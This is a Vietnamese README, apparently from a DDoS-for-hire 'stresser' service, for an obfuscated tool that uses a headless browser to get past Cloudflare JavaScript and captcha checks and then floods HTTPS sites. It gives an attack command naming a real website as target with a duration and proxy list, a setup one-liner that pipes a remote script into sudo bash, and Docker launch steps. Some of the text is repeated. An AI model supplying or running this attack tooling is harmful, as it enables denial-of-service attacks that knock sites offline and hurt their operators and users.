Phương thức bỏ qua này sẽ gửi yêu cầu ban đầu thông qua Trình duyệt để bỏ qua JS và khi đạt đến 16 lần bỏ qua, nó sẽ bắt đầu tấn công. Nó chỉ hoạt động trên các trang web HTTPS://.

Phương pháp này sạch sẽ và không chứa bất kỳ vi rút nào nhưng tôi đã mã hóa nó để ngăn chặn sự sửa đổi của những người không phải là tác giả.

Nó hoạt động chủ yếu trên Cloudflare JS và Captcha nhưng có thể hoạt động trên các biện pháp bảo vệ khác, nó có thể cần sửa đổi trên thư viện flare.

Phương pháp này được mã hóa bởi @jeffspender cho CryptoS Stresser.com

Phương thức bỏ qua này sẽ gửi một yêu cầu ban đầu thông qua trình duyệt để bỏ qua JS và khi đạt đến 16 lần bỏ qua, nó sẽ khởi động cuộc tấn công. Nó chỉ hoạt động với các trang web HTTPS://.

Phương pháp này sạch sẽ và không chứa bất kỳ vi rút nào, nhưng tôi đã mã hóa nó để ngăn những người không phải tác giả sửa đổi.

Nó chủ yếu hoạt động với Cloudflare JS và Captcha, nhưng có thể hoạt động trên các biện pháp bảo vệ khác, nó có thể yêu cầu sửa đổi thư viện flare.

Phương thức này được mã hóa bởi @jeffspender. CryptoS Stresser.com

Yêu cầu: 
```
./browser-linux https://exitus.me/ 300 proxies.txt
```
Cài đặt phần mềm được yêu cầu và khởi động lại máy chủ:
```
sudo apt -y install curl dirmngr apt-transport-https lsb-release ca-certificates;curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -;sudo apt -y install nodejs;sudo apt -y install gcc g++ make;sudo apt -y install htop vnstat;sudo apt-get install -y unzip;sudo apt -y install screen;sudo apt -y install unrar;sudo apt -y install golang-go; go get github.com/erikdubbelboer/gspt; npm i await-timeout;npm i console-log-level;npm i events; npm i request;npm i chalk; npm i hpagent; npm i got; npm i crypto; npm i cheerio; npm i url; npm i axios; npm i https; npm i request-curl;npm i user-agents; npm i uuid; npm i tmp-promise; npm i puppeteer-extra;npm i puppeteer-extra-plugin-stealth;npm i sleep-promise; npm i puppeteer-extra-plugin-adblocker;sudo apt install apt-transport-https ca-certificates curl software-properties-common; curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -;sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"; sudo apt update; sudo apt install docker-ce; sudo curl -L "https://github.com/docker/compose/releases/download/1.26.0/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose;sudo chmod +x /usr/local/bin/docker-compose; echo  "\n${gren}Installation Modules Required Done, Preparing the Next Stage..\n${white}"; sleep 6; npm install puppeteer; sudo apt install -y gconf-service libasound2 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils wget; sudo apt-get install -y libgbm-dev;echo -e "\n${red}Reboot Server Required..\n${white}"; sleep 6; reboot
```

Khởi động phiên bản trình duyệt Chrome:
```
cd /root/flare/8120; export PUPPETEER_PRODUCT=firefox; sudo npm install;node node_modules/puppeteer/install.js;export PUPPETEER_PRODUCT=firefox; docker-compose up -d; docker build -t cryptostresser:custom .;screen -S browser -dms LIBCRYPTOSTRESSER docker run -p 8120:8120 -e LOG_LEVEL=debug cryptostresser:custom
```
Đảm bảo rằng trình duyệt đang chạy với:

trình duyệt thứ ba trên màn hình
